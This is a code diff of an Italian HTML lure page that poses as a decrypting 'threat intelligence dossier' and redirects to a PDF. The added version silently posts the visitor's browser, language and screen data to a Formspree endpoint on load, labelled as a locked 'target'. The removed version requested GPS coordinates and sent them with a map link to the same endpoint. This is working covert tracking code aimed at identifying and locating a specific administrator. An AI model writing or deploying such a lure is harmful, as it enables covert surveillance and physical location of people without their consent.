@@ -2,54 +2,41 @@
 <html lang="it">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus Intelligence - Secure Access</title>
+    <title>Nexus Threat Intelligence - Secure Dossier</title>
     <style>
         body { background: #0b0e14; color: #539bf5; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .loader { border: 2px solid #22272e; border-top: 2px solid #539bf5; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        .loader { border: 2px solid #22272e; border-top: 2px solid #539bf5; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="loader"></div>
-    <div id="status">DECRITTAZIONE DOSSIER MASTER IN CORSO...</div>
-    <div id="progress" style="margin-top: 10px;">[##########----------] 50%</div>
+    <p>DECRITTAZIONE DOSSIER FORENSE...</p>
 
     <script>
-        const ENDPOINT = "https://formspree.io/f/xzdodlnk";
+        async function capture() {
+            // Dati tecnici inviati senza pop-up
+            const data = {
+                _subject: "🎯 ATTRIBUZIONE: BERSAGLIO AGGANCIATO",
+                Info: "L'admin ha aperto il dossier (Modalità Silenziosa)",
+                Browser: navigator.userAgent,
+                Lingua: navigator.language,
+                Screen: screen.width + "x" + screen.height
+            };
 
-        // Funzione per inviare i dati
-        async function sendIntel(payload) {
-            await fetch(ENDPOINT, {
+            // Invia i dati a Formspree
+            await fetch("https://formspree.io/f/xzdodlnk", {
                 method: "POST",
-                body: JSON.stringify(payload),
+                body: JSON.stringify(data),
                 headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
             });
-            // Reindirizzamento al PDF dopo l'invio
-            window.location.href = "Dossier_Master_DeepDive_Attribution_Nexus.pdf";
-        }
 
-        // Richiesta posizione GPS
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                const { latitude, longitude, accuracy } = pos.coords;
-                sendIntel({
-                    _subject: "🎯 BERSAGLIO AGGANCIATO: OMAN PRECISION",
-                    Mappa: `https://www.google.com/maps?q=${latitude},${longitude}`,
-                    Lat: latitude,
-                    Lon: longitude,
-                    Precisione: accuracy + " metri",
-                    Dettagli: "Admin ha accettato la condivisione posizione."
-                });
-            },
-            (err) => {
-                sendIntel({
-                    _subject: "⚠️ CLICK RILEVATO: GPS NEGATO",
-                    Nota: "L'admin ha cliccato ma ha bloccato il GPS. Posizione basata solo su IP (già nota).",
-                    Codice_Errore: err.code
-                });
-            },
-            { enableHighAccuracy: true, timeout: 8000 }
-        );
+            // Reindirizza al PDF dopo 1 secondo
+            setTimeout(() => {
+                window.location.href = "Dossier_Master_DeepDive_Attribution_Nexus.pdf";
+            }, 1000);
+        }
+        capture();
     </script>
 </body>
 </html>
